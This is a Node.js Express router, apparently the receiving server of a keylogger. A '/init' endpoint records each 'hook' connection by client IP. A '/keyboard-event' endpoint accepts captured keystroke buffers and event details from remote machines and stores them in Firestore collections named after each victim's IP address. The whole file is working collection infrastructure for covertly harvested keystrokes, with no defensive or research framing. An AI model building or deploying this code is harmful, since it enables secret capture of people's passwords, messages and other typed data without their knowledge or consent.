const express = require('express');
const { initializeApp } = require("firebase/app");
const { getFirestore, collection, addDoc } = require("firebase/firestore");
const moment = require('moment-timezone');

const router = express.Router();
const firebaseConfig = {
    apiKey: process.env.FIREBASE_API_KEY,
    authDomain: process.env.FIREBASE_AUTH_DOMAIN,
    databaseURL: process.env.FIREBASE_DATABASE_URL,
    projectId: process.env.FIREBASE_PROJECT_ID,
    storageBucket: process.env.FIREBASE_STORAGE_BUCKET,
    messagingSenderId: process.env.FIREBASE_MESSAGING_SENDER_ID,
    appId: process.env.FIREBASE_APP_ID
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Function to get real client IP
const getClientIp = (req) => {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (xForwardedFor) {
        return xForwardedFor.split(',')[0]; // Get the first IP in the list
    }
    return req.ip; // Fallback to req.ip
};

router.get('/init', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        console.log(`Hook initialized: ${clientIp}`);

        const tokyoTime = moment().tz("Asia/Tokyo").format();
        const logData = {
            ip: clientIp,
            type: "connection",
            timestamp: tokyoTime,
            message: `Hook Connected: ${clientIp}`,
        };
        await addDoc(collection(db, `Events_${clientIp}`), logData);

        res.status(200).send('OK');
    } catch (err) {
        console.log("Error handling message:", err);
        res.status(500).send('Error');
    }
});

router.post('/keyboard-event', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        const data = req.body;
        console.log(`Received input buffer: ${data.inputBuffer}`);

        const tokyoTime = moment().tz("Asia/Tokyo").format();
        const logData = {
            ip: clientIp,
            type: "keyboard_event",
            timestamp: tokyoTime,
            message: `Keyboard Event: ${data.inputBuffer}`,
            data: data.inputBuffer,
            detail: data.event,
        };
        await addDoc(collection(db, `Events_${clientIp}`), logData);

        res.status(200).send('OK');
    } catch (err) {
        console.log("Error handling message:", err);
        res.status(500).send('Error');
    }
});

module.exports = router;